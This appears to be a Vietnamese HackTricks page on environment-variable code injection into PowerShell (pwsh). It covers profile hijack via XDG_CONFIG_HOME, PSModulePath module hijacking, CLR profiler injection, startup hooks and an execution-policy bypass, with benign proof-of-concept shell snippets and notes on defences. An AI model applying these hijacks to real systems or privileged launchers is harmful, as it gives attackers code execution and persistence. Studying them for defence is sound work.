# Chèn mã vào ứng dụng PowerShell trên macOS

{{#include ../../../banners/hacktricks-training.md}}

PowerShell đa nền tảng: cùng một binary `pwsh` chạy trên macOS, Linux và Windows, và đây là một **ứng dụng .NET (Core)**. Vì vậy, kẻ tấn công kiểm soát môi trường của một lần gọi `pwsh` có thể dùng một số primitive thực thi mã thông qua biến môi trường, hoạt động giống hệt trên cả ba hệ điều hành, cùng với một vài primitive chỉ có trên Windows. Tất cả đều thực thi **trước** (hoặc thay cho) `-Command`/`-File` mà nạn nhân định chạy, nên chúng rất hiệu quả khi nhắm vào các wrapper có đặc quyền, tác vụ cron/`launchd`/systemd và CI runner gọi `pwsh` với môi trường được kế thừa.

## `XDG_CONFIG_HOME` và PowerShell profiles

Trên macOS và Linux, PowerShell sử dụng các đường dẫn cấu hình XDG và thực thi các script profile của người dùng khi `pwsh` khởi động. Chuyển hướng `XDG_CONFIG_HOME` sẽ thay đổi thư mục chứa `powershell/profile.ps1` và `powershell/Microsoft.PowerShell_profile.ps1` dành riêng cho console host; do đó, một file do kẻ tấn công kiểm soát ở đó có thể thực thi trước payload `-Command`.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
mkdir -p /tmp/ps-config/powershell
cat >/tmp/ps-config/powershell/Microsoft.PowerShell_profile.ps1 <<'PS1'
New-Item -ItemType File -Path /tmp/powershell-profile-executed -Force | Out-Null
PS1

XDG_CONFIG_HOME=/tmp/ps-config pwsh -Command '$true'
```

Điều này áp dụng cho PowerShell 6+ (`pwsh`) trên các nền tảng không phải Windows; Windows PowerShell sử dụng các vị trí profile khác. `pwsh -NoProfile` ngăn tải profile. Ngoài ra, hãy kiểm tra `HOME` và tên profile dành riêng cho từng host vì các host PowerShell khác có thể chọn những script khác.

> [!TIP]
> Trên **Windows**, đường dẫn profile được xác định dựa trên thư mục đã biết `$HOME` / *Documents* (ví dụ: `Documents\PowerShell\Microsoft.PowerShell_profile.ps1` với `pwsh`, `Documents\WindowsPowerShell\...` với Windows PowerShell), vì vậy việc tác động đến `HOME`/`USERPROFILE` — hoặc đơn giản là ghi vào tệp đó — cũng tạo ra primitive tương đương.

## `PSModulePath` module auto-loading hijack

Từ PowerShell 3.0, **module auto-loading** tự động import một module khi một lệnh do module đó export được tham chiếu lần đầu (được gọi, dùng với `Get-Command` hoặc gọi bằng tab-completion). PowerShell tìm kiếm đệ quy trong mọi thư mục được liệt kê trong **`$Env:PSModulePath`** để tìm các tệp `.psd1`/`.psm1`; trên hệ điều hành không phải Windows, `PSModulePath` được kế thừa từ process sẽ được giữ nguyên. Vì vậy, nếu có thể **thêm một thư mục vào đầu `PSModulePath`**, bạn có thể cài một module khớp với lệnh mà script của victim gọi hoặc tên module mà script `Import-Module` — và code trong phạm vi module của bạn sẽ chạy tại thời điểm import.<sup>[[3]](#references)</sup>

Vì cơ chế phân giải lệnh của PowerShell là *Alias → Function → Cmdlet → Application*, một **function do module của bạn export có thể che khuất cmdlet tích hợp sẵn** mà target sử dụng (ví dụ: `Get-ChildItem`), nên bạn thậm chí không cần victim import bất kỳ thứ gì theo tên.

```bash
# Attacker-controlled module dir prepended to PSModulePath
mkdir -p /tmp/evil/Hijack
cat >/tmp/evil/Hijack/Hijack.psm1 <<'PS1'
# Top-level module code runs at import time
New-Item -ItemType File -Path /tmp/psmodulepath-executed -Force | Out-Null
function Invoke-Report { 'hijacked' }   # shadows whatever the victim calls
Export-ModuleMember -Function Invoke-Report
PS1
cat >/tmp/evil/Hijack/Hijack.psd1 <<'PS1'
@{ ModuleVersion = '1.0'; RootModule = 'Hijack.psm1'; FunctionsToExport = @('Invoke-Report') }
PS1

# Victim runs pwsh with an inherited/attacker-influenced PSModulePath and calls Invoke-Report
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/psmodulepath-executed && echo 'PSModulePath auto-load executed'
```

Trên **Windows**, điều tương tự cũng áp dụng (`;` phân tách các đường dẫn); `PSModulePath` cũng lấy giá trị từ `HKCU:\Environment` và `HKLM:\...\Session Manager\Environment`, vì vậy một giá trị ở phạm vi người dùng có thể ghi cũng là một primitive để duy trì quyền truy cập. Có thể tắt tính năng tự động tải bằng `$PSModuleAutoloadingPreference = 'None'`, và `pwsh -NoProfile` **không** ngăn được tính năng này.

## CLR profiler injection (`CORECLR_PROFILER` / `COR_PROFILER`)

`pwsh` chạy trên .NET Core, vì vậy **CLR profiling API** tải một DLL/`.so`/`.dylib` của attacker vào tiến trình ngay khi khởi động chỉ thông qua environment — không cần chữ ký hay đăng ký COM, vì các biến `*_PATH` được ưu tiên hơn registry. `DllMain`/entry point của thư viện profiler thực thi bên trong tiến trình PowerShell, đây là một kỹ thuật thực thi mã trong tiến trình và duy trì quyền truy cập kinh điển (MITRE ATT&CK **T1574.012**).<sup>[[4]](#references)</sup>

```bash
# .NET Core / .NET 5+ (pwsh) — cross-platform. Use .so on Linux, .dylib on macOS, .dll on Windows.
CORECLR_ENABLE_PROFILING=1 \
CORECLR_PROFILER='{cf0d821e-299b-5307-a3d8-b283c03916db}' \
CORECLR_PROFILER_PATH=/tmp/evil_profiler.so \
  pwsh -Command '$true'
```

- Trên **.NET 8+**, các biến cũng có thể dùng tiền tố mới hơn là `DOTNET_` (`DOTNET_EnableDiagnostics=1`, `DOTNET_ENABLE_PROFILING=1`, `DOTNET_PROFILER`, `DOTNET_PROFILER_PATH`); `CORECLR_*` được giữ lại để tương thích ngược.
- Trên **Windows PowerShell 5.1** (`powershell.exe`, .NET Framework), bộ ba tương đương là **`COR_ENABLE_PROFILING=1`**, **`COR_PROFILER={CLSID}`** và **`COR_PROFILER_PATH=C:\evil.dll`**.

DLL profiler chỉ cần là một thư viện COM/ICorProfilerCallback hợp lệ (hoặc đơn giản là thực hiện công việc của nó từ `DllMain`). Các trình khởi chạy có cơ chế phòng thủ nên loại bỏ `COR_*`/`CORECLR_*`/`DOTNET_*` khỏi môi trường có đặc quyền.

## `DOTNET_STARTUP_HOOKS` (hook .NET chạy trước `Main`)

Vì `pwsh` là ứng dụng .NET Core, **`DOTNET_STARTUP_HOOKS`** trỏ đến một assembly được quản lý, trong đó `StartupHook.Initialize()` chạy đồng bộ trước `Main` của host — tức là trước khi PowerShell khởi chạy. Đây là primitive dùng mã được quản lý gọn nhất và được chia sẻ với mọi ứng dụng .NET khác:

{{#ref}}
macos-.net-applications-injection.md
{{#endref}}

## `PSExecutionPolicyPreference` (bypass cơ chế kiểm soát của Windows)

Trên Windows, việc đặt biến môi trường **`$Env:PSExecutionPolicyPreference`** (ví dụ thành `Bypass` hoặc `Unrestricted`) sẽ ghi đè Execution Policy có hiệu lực cho tiến trình đó — đây chính xác là giá trị mà `Set-ExecutionPolicy -Scope Process` thiết lập. Bản thân nó không thực thi mã, nhưng loại bỏ rào cản “chặn các script chưa ký”, vốn thường là mắt xích còn thiếu để một trong các primitive ở trên (profile/module được cài cắm) thực sự chạy. Execution Policy chỉ có trên Windows và chưa bao giờ là ranh giới bảo mật.<sup>[[5]](#references)</sup>

## References

- [1] [Biến môi trường PowerShell và đường dẫn XDG](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
- [2] [Profile PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
- [3] [about_PSModulePath và tự động tải module](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [4] [Cài đặt cấu hình gỡ lỗi và profiling .NET (các biến profiler CORECLR_/DOTNET_)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
- [5] [about_Execution_Policies (PSExecutionPolicyPreference)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)
{{#include ../../../banners/hacktricks-training.md}}
